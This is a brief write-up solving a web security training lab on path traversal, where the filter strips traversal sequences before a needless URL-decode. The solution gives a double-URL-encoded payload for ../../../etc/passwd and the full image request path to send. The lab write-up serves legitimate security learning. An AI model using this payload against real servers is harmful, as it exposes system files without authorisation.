# Lab Writeup: File path traversal, traversal sequences stripped with superfluous URL-decode

URL: https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-superfluous-url-decode

## Description

This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

1. Open in new tab one of the images e.g: `https://0a80000c03ffe99d885933f7004500eb.web-security-academy.net/image?filename=6.jpg`
2. Change the filename param to become `../../../etc/passwd` using burp repeater but before that, you have to encode it to URL encoding twice first. Here's the complete encoding: `%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`. Here's the full path `/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`
3. Send the request, get all the file's contents and the challenge is solved

   ![Encoded Path Traversal](/assets/encoded-path-traversal.png)
